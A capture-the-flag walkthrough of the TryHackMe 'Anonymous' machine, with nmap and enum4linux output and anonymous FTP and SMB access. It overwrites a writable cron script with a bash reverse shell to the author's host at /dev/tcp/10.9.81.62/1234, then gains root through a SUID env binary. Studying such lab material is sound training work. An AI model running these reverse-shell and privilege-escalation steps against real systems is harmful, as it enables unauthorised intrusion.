Anonymous is an intermediate boot2root machine BY TryHackMe.
Its a good machine to improve enumeration and pentesting skills.
IP: 10.10.118.122 

Nmap scan results

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonymous# nmap -A -T4 10.10.118.122 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:10 IST
Nmap scan report for 10.10.118.122
Host is up (0.15s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.81.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=33617%PV=Y%DS=2%DC=T%G=Y%TM=5F797C9
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)



1) Enumerate the machine.  How many ports are open?
-> 4

2) What service is running on port 21?
-> ftp

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonymous# ftp 10.10.96.190
Connected to 10.10.96.190.
220 NamelessOne's FTP Server!
Name (10.10.96.190:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000          989 Oct 04 07:52 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (1.4898 MB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.08 secs (0.8714 kB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (1032 bytes).
226 Transfer complete.
1032 bytes received in 0.00 secs (5.3489 MB/s)
ftp> 



3) What service is running on ports 139 and 445?
-> smb

4)There's a share on the user's computer.  What's it called?
-> pics 

root@LAPTOP-U5913CMD:/home/akshay# enum4linux  10.10.96.190 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct  4 13:19:51 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.96.190
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.96.190    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.96.190    |
 ============================================ 
Looking up status of 10.10.96.190
        ANONYMOUS       <00> -         B <ACTIVE>  Workstation Service
        ANONYMOUS       <03> -         B <ACTIVE>  Messenger Service
        ANONYMOUS       <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.96.190    |
 ===================================== 
[+] Server 10.10.96.190 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.96.190    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.96.190    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.96.190 from smbclient: 
[+] Got OS info for 10.10.96.190 from srvinfo:
        ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 10.10.96.190    |
 ============================= 
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone      Name: namelessone       Desc: 

user:[namelessone] rid:[0x3eb]

 ========================================= 
|    Share Enumeration on 10.10.96.190    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.96.190
//10.10.96.190/print$   Mapping: DENIED, Listing: N/A
//10.10.96.190/pics     Mapping: OK, Listing: OK
//10.10.96.190/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.96.190    |
 ==================================================== 


[+] Attaching to 10.10.96.190 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ANONYMOUS
        [+] Builtin

[+] Password Info for Domain: ANONYMOUS

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.96.190    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.96.190 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
S-1-5-21-2144577014-3591677122-2188425437-500 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
S-1-22-1-1000 Unix User\namelessone (Local User)


root@LAPTOP-U5913CMD:/home/akshay/Desktop/Anonymous# smbclient //10.10.96.190/pics
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 16:41:34 2020
  ..                                  D        0  Thu May 14 07:29:10 2020
  corgo2.jpg                          N    42663  Tue May 12 06:13:42 2020
  puppos.jpeg                         N   265188  Tue May 12 06:13:42 2020

                20508240 blocks of size 1024. 13211496 blocks available
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (44.9 KiloBytes/sec) (average 44.9 KiloBytes/sec)
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (156.8 KiloBytes/sec) (average 116.5 KiloBytes/sec)
smb: \>   


We can write some script to the clean.sh as it is writable and also running as cron.
I found out about this by looking at the removed_files.log as it gets updated every 1-2 mins.

Script to update:
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        bash -i >& /dev/tcp/10.9.81.62/1234 0>&1 // Reverse shell to get connection
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi


We can edit the clean.sh through ftp using append and listen for incoming connection on the port number 1234.


root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.161.253 53332
bash: cannot set terminal process group (1274): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ 


namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f9925###################
namelessone@anonymous:~$ 

Now I searched for SUID bit set files using the following command.
namelessone@anonymous:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec

We can use /usr/bin/env to get root access.
You can read about the binary on the following website.
https://gtfobins.github.io/gtfobins/env/#suid

namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
cd /root
ls
root.txt
cat root.txt
4d930091c3##################

Thank you...Happy Hacking :)

